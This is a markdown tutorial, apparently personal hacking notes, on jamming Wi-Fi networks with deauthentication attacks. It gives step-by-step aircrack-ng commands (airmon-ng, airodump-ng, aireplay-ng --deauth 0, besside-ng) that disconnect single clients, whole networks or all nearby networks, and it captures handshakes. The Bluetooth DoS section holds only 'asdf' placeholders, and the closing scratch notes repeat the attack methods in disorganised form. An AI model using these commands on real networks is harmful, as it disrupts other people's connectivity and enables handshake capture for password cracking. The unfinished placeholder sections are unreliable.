<h1 align="center">Network Jamming / Network Spoofing</h1>

## Deauth. attack  

The **Deauth** attack perform on Wi-Fi (802.11) network only. It won't affect those people who are using internet via Ethernet cable (IEEE 802.3) i.e. wired cable. The target of this attach have 3 types :  
- [x] Attack on **a particular client** of a particular Wi-Fi's network (specific client if have/know his mac addreess)
- [x] Attack on **all clients** of a particular Wi-Fi's network (if don't know any client's MAC address)
- [x] Attack on **all Wi-Fi** available networks/routers directly.

> But to attack on Ethernet cable using clients, the methods are : ARP Spoofing / ARP Poisoning (Man-in-the-Middle Attack), DHCP Starvation or Rogue DHCP Attack, Switch MAC Flooding (CAM Table Overflow). But these we won't learn here, or maybe we'll learn it later.

`~$` is local user.  
`~#` is root user.  




#### Step 1 : Setup for Attack
First we need to convert the 'wlan0' interface to 'wlan0mon' interface, basically we are do setup & enabling the Wi-Fi's monitoring mode to do attack. For this we use the following commands :  
```
sudo su
iwconfig
ifconfig wlan0
airmon-ng
iwconfig wlan0
// airmon-ng start wlan0
airmon-ng check kill (2 times) . . .
airmon-ng stop wlan0 . . .
iw wlan0 del
airmon-ng start wlan0mon
iwconfig
rfkill list


clear
exit
exit
```
Run the above commands one-by-one only.  
<br>


#### Step 2 : Searching your targeted Wi-Fi network/router
Now run the following commands :  
```
airodump-ng wlan0mon

- - -ctrl + C to stop
- - -Can close if done work
```
So, when it dispaly the required network then we can stop the process with 'ctrl + C' shortcut. But don't close this tab, it helps to copy network's channel no. & BSSID.  
<br>


#### Step 3 : Locking targeted Wi-Fi/router and Searching your targeted client
Now open new terminal tab and run the following commands :  
```
sudo su


airodump-ng wlan0mon --bssid "_" -c "_"
	(OR)
airodump-ng --bssid "_" -c "_" wlan0mon
	(OR)
airodump-ng -c_ -d "__BSS-ID__" wlan0mon


- - - - -Keep running, don't close
```
**Don't close it, keep running**. So, here we need to mentioned a particular Wi-Fi network's BSSID & channel no. And from this we are setting to attack on a particular Wi-Fi network. If want to attack all network then don't mention BSSID & channel no.
<br>


#### Step 4 : Attacking (on particular Client // on all Clients)
Now open new terminal tab and run the following commands :  
```
sudo


aireplay-ng --deauth 0 -a "___BSS-ID___" -c "__STATION__" wlan0mon
	(OR)
besside-ng -c "_" wlan0mon


- - - - -ctrl + C ----😁
```
Here, if we want to attack all then don't mention BSSID & station of any client. Also, here `--deauth 0` means unlimited attack and we can even change it to `10` or `100` also.  






---
---



## Bluetooth DOS attack

#### Step 1 : Bluetooth Enable (optional)
Check whether the Bluetooth is enabled or not. If not enabled then enable it and proceed to **next step**. But if the Bluetooth icon not appearing, or it's not enabling, then follow the below commands :   
```
~$ asdf
```
```
~# asdf
```

<br>

#### Step 2 :  
asdf










------
------
------
rfkill list all

	xxx	sudo apt-get update

sudo apt reinstall blueman

sudo apt reinstall bluetooth

/etc/init.d/bluetooth status

sudo /etc/init.d/bluetooth start



sudo systemctl list-unit-files --type=service

          to exit---> ctrl + C

sudo systemctl enable blueman-mechanism.service

sudo systemctl enable bluetooth.service

sudo systemctl list-unit-files --type=service

exit

			// https://youtu.be/w1MvrcBSNjw
------
------
------

convert wlan0 to wlan0mon
-------------------------
sudo su
iwconfig
airmon-ng stop wlan0
iw wlan0 del
airmon-ng start wlan0mon
rfkill list

----------------------------
method-1
---------
sudo su
airmon-ng check kill
airmon-ng start wlan0

airodump-ng wlan0mon
ctrl+C
	
	sudo su
	cd Desktop
	airodump-ng wlan0mon --bssid "_" -c "_" -w demo

		sudo su
		aireplay-ng --deauth 0 -a "___BSS-ID___" wlan0mon
		ctrl+C, ^ ENTER....

after handshake...
---------------------------------
method-2
---------
sudo su
airmon-ng
iwconfig
clear

airmon-ng start wlan0
airmon-ng check kill (2)
airmon-ng start wlan0
clear
airmon-ng start wlan0mon
clear
iwconfig

airodump-ng wlan0mon
ctrl+C

	sudo su
	cd Desktop
	airodump-ng --bssid "_" -c "_" -w demo wlan0mon  //  (attack all networks don't metioned client/channel and bssid)

		sudo su
		besside-ng -c "_" wlan0mon  //  (attack all networks don't metioned client)

after handshake...
----------------------------------
method-3
--------

iwconfig
ifconfig wlan0
airmon-ng start wlan0
iwconfig
clear

airodump-ng wlan0mon
ctrl+C

sudo su
cd Desktop
airodump-ng -c_ -w demo -d "__BSS-ID__" wlan0mon

	sudo su
	aireplay-ng --deauth 0 -a "__BSS-ID__" -c "__STATION__" wlan0mon // (all or particular member using -c and station)
	ctrl+C

after handshake...
airmon-ng stop wlan0mon	


